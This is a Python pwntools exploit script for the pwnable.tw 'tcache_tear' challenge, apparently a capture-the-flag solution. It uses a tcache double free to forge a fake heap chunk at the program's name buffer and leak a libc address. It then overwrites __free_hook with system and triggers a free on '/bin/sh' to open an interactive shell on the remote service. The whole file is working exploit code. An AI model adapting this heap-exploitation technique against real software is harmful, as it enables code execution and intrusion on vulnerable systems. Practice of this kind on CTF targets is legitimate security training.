# !/bin/python3
from pwn import *

context.terminal = ["tmux","splitw", "-h"]
context.arch = "amd64"
# context.log_level = "debug"

def Name(io:tube,name):
    io.recvuntil(b"Name:")
    io.send(name)

def choice(io, ch):
    io.recvuntil(b"Your choice :")
    io.send(str(ch).encode())

def Size(io,sz):
    io.recvuntil(b"Size:")
    io.send(str(sz).encode())

def Data(io,dt):
    io.recvuntil(b"Data:")
    io.send(dt)

def Free(io):
    choice(io,2)

def Info(io):
    choice(io,3)
    io.recvuntil(b"Name :")
    return io.recv(0x20)

def Alloc(io,size,data):
    choice(io,1)
    Size(io,size)
    Data(io,data)

def demo_overflow(io):
    Name(io,b"hello")
    choice(io,1)
    Size(io,8)
    Data(io,b"a"*0x20)

def double_free(io,size):
    # Name(io,b"hello")
    Alloc(io,size,b'aaaaaaaa')
    Free(io)
    Free(io)

def fake_chunk_at_name(io):
    name = 0x602060
    ptr = 0x602088
    prev_size = 0x21
    size = 0x421
    Name(io,p64(prev_size)+p64(size)+b"a")
    double_free(io,0x8)
    Alloc(io,0x8,p64(name-0x10))
    Alloc(io,0x8,b"a")
    Alloc(io,0x8,p64(prev_size)+p64(size)+b"a"*0x410+p64(size)+p64(0x21)+p64(0)+p64(0)+p64(0x21)+p64(0x21))

def set_ptr_to_name(io):
    name = 0x602060
    ptr = 0x602088
    double_free(io,0xff)
    Alloc(io,0xff,p64(ptr))
    Alloc(io,0xff,b"a")
    Alloc(io,0xff,p64(name))

def leak_libc(io):
    offset = 0x3ebca0
    target = u64(Info(io)[:8])
    return target - offset
    
def set_free_hook(io,libc:ELF):
    double_free(io,0x30)
    Alloc(io,0x30,p64(libc.symbols["__free_hook"]-0x10))
    Alloc(io,0x30,b"a")
    Alloc(io,0x30,b"/bin/sh\00".ljust(0x10,b"\00")+p64(libc.symbols["system"]))

DEBUG = False

gdb_scritps = "set $name=0x602060\n \
           x/16gx $name-0x10\n "

if __name__ == '__main__':
    if DEBUG:
        io = process("./tcache_tear")
    else:
        io = remote("chall.pwnable.tw",10207)
    _bin = ELF("./tcache_tear")
    libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
    # demo_overflow(io)
    fake_chunk_at_name(io)
    set_ptr_to_name(io)
    Free(io)
    libc.address = leak_libc(io)
    # print(f"leaked libc at: {hex(libc.address)}")
    success(f"Libc base: {hex(libc.address)}")
    success( "Found __free_hook: {}".format(hex(libc.symbols["__free_hook"])) )

    set_free_hook(io,libc)
    Free(io)
    # gdb.attach(io,gdbscript=gdb_scritps)
    io.interactive()